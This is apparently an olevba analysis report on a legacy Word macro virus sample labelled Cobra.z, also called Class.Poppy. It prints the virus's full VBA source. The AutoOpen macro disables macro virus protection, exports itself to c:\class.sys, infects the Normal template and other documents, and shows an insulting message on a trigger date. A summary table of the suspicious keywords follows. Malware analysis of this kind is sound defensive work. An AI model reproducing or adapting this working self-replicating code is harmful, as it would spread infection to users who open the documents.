olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.z-1b6665c5ced5474ea2cac1eef017668d1f7dec63
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Модуль1.bas 
in file: Virus.MSWord.Cobra.z-1b6665c5ced5474ea2cac1eef017668d1f7dec63 - OLE stream: '_VBA_PROJECT_CUR/VBA/Модуль1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo out

Options.VirusProtection = False

Options.SaveNormalPrompt = False

Options.ConfirmConversions = False

ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines

nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines

If nt > 70 And ad > 0 Then GoTo out

If nt < 70 Then

    Set host = NormalTemplate.VBProject.VBComponents.Item(1)

    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name

    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"

End If

If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)

If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"

host.codemodule.AddFromFile ("c:\class.sys")

With host.codemodule

    For x = 1 To 4

    .deletelines 1

    Next x

End With

If nt < 70 Then

    With host.codemodule

    .replaceline 1, "Sub AutoClose()"

    .replaceline 71, "Sub ToolsMacro()"

    End With

End If

With host.codemodule

    For x = 2 To 72 Step 2

    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow

    Next x

End With

out:

If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Sub ViewVBCode()
'Class.Poppy v 1.2 by VicodinES /TNN /CB
End Sub

-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSWord.Cobra.z-1b6665c5ced5474ea2cac1eef017668d1f7dec63 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSWord.Cobra.z-1b6665c5ced5474ea2cac1eef017668d1f7dec63 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  c
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

